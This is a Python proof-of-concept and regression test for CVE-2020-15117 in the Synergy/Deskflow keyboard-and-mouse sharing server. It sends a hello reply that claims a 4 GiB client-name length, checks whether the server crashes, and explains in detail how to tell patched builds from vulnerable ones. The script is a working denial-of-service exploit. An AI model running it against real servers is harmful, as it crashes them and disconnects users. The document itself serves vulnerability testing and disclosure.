#!/usr/bin/env python3
"""
CVE-2020-15117 - Synergy server crash via oversized kMsgHelloBack name length.

Reported to Symless by Sven Blumenstein of Apple Information Security against
Synergy 1.12.0, protocol 1.6, and fixed in Synergy 1.12.0. Advisory
GHSA-chfm-333q-gfpp, published 2020-07-14, vulnerable < 1.12.0.

After the server sends its "Synergy" hello, the client replies with
kMsgHelloBack ("%7s%2i%2i%s"), whose trailing client name is a length-prefixed
string. The length is a raw 4-byte value taken straight from the wire and handed
to ProtocolUtil::readBytes, which uses it to size a heap buffer. A client that
claims 0xffffffff asks the server for a 4 GiB allocation. When that allocation
fails, std::bad_alloc was uncaught on this path and the server process
terminated, disconnecting every screen.

The fix is two layers, both still present in src/lib/deskflow/ProtocolUtil.cpp:
  - readBytes wraps `new uint8_t[len]` in a try/catch (the comment there still
    cites GHSA-chfm-333q-gfpp) and rethrows after logging.
  - readf catches std::bad_alloc and returns false, so ClientProxyUnknown::
    handleData raises BadClientException, answers EBAD and drops the connection.

READ THIS BEFORE TRUSTING A PASS. The crash only ever happened when the
allocation actually failed. On 64-bit Linux with default overcommit a 4 GiB
`new` succeeds, the server then fails the read on the truncated body, and
readf's pre-existing IOException catch produces EBAD. An unfixed server does
exactly the same thing in that case, so EBAD does NOT by itself distinguish
fixed from vulnerable. Only the crash does. Constrain the server's address
space so the allocation cannot be satisfied:

    bash -c 'ulimit -v 3145728; exec ./build/bin/synergy-core server \
        --new-instance -s /path/to/server.conf'

Validation, on x86_64 Linux:
  - PASS branch confirmed against synergy-core v1.21.2-dev+c53597b3 under that
    limit (its own footprint is about 1.2 GiB, so the 4 GiB request cannot be
    met). It logs "bad alloc, unable to allocate memory", answers EBAD and
    stays up.
  - FAIL branch confirmed on the shared upstream code in Deskflow, with both
    bad_alloc catches removed to simulate pre-1.12.0: the server terminates on
    this single message and this script reports VULNERABLE. Synergy carries
    that same fix at the same path, so the branch was not re-exercised here.
Without the ulimit both builds answer EBAD and the test proves nothing.

Do not use PROTOCOL_MAX_STRING_LENGTH as the signal. That cap exists in
ProtocolUtil.cpp and looks like the relevant guard, but its LOG_ERR never fires
on this path; it is checked against the format specifier's length, not the
length read off the wire. Confirmed empirically: a claimed 0xffffffff produced
EBAD with no such log line.

Needs a plaintext server; this PoC does not speak TLS. It echoes back whatever
seven-byte protocol name the server greets with, so it also works unmodified
against Deskflow, which defaults to "Barrier".
"""

import argparse
import socket
import struct
import sys

from utils import normalize_host

CLAIMED_NAME_LEN = 0xFFFFFFFF


def read_msg(sock):
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            return None
        hdr += chunk
    size = struct.unpack(">I", hdr)[0]
    if size > 4096:
        return None
    body = b""
    while len(body) < size:
        chunk = sock.recv(size - len(body))
        if not chunk:
            return None
        body += chunk
    return body


def server_alive(host, port, timeout=5.0):
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError:
        return False
    try:
        sock.settimeout(timeout)
        return (read_msg(sock) or b"").startswith((b"Synergy", b"Barrier"))
    except OSError:
        return False
    finally:
        sock.close()


def send_oversized_hello(host, port, timeout=5.0):
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    try:
        hello = read_msg(sock)
        if not hello or not hello.startswith((b"Synergy", b"Barrier")):
            return "no-hello"

        # echo the server's own protocol name; Synergy greets as "Synergy",
        # Deskflow defaults to "Barrier". Both are seven bytes.
        protocol_name = hello[:7]
        major, minor = struct.unpack(">hh", hello[7:11])
        body = protocol_name + struct.pack(">hh", major, minor)
        body += struct.pack(">I", CLAIMED_NAME_LEN) + b"A"
        sock.sendall(struct.pack(">I", len(body)) + body)

        try:
            reply = sock.recv(4096)
        except socket.timeout:
            return "no-reply"
        if not reply:
            return "closed"
        if b"EBAD" in reply:
            return "rejected (EBAD)"
        if b"EICV" in reply:
            return "rejected (incompatible)"
        return "accepted"
    finally:
        sock.close()


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="localhost")
    ap.add_argument("--port", type=int, default=24800)
    ap.add_argument("--timeout", type=float, default=5.0)
    args = ap.parse_args()
    host = normalize_host(args.host)

    print("CVE-2020-15117 - oversized kMsgHelloBack name length")
    print(f"target: {host}:{args.port}\n")

    if not server_alive(host, args.port, args.timeout):
        print("[ERROR] no server hello on that address (tls must be disabled)")
        return 2

    print(f"[*] sending kMsgHelloBack claiming a {CLAIMED_NAME_LEN} byte client name")
    try:
        outcome = send_oversized_hello(host, args.port, args.timeout)
    except OSError as exc:
        print(f"[*] connection error while sending: {exc}")
        outcome = "error"
    print(f"[*] server response: {outcome}")

    if not server_alive(host, args.port, args.timeout):
        print("[FAIL] server stopped accepting connections - VULNERABLE (CVE-2020-15117)")
        return 1

    if outcome == "accepted":
        print("[FAIL] server accepted the oversized name length - VULNERABLE (CVE-2020-15117)")
        return 1

    print(f"[PASS] server refused the message ({outcome}) and stayed up")
    print("       conclusive only if the server was started under 'ulimit -v 3145728';")
    print("       otherwise overcommit satisfies the 4 GiB request and an unfixed")
    print("       server answers EBAD too. See the module docstring.")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
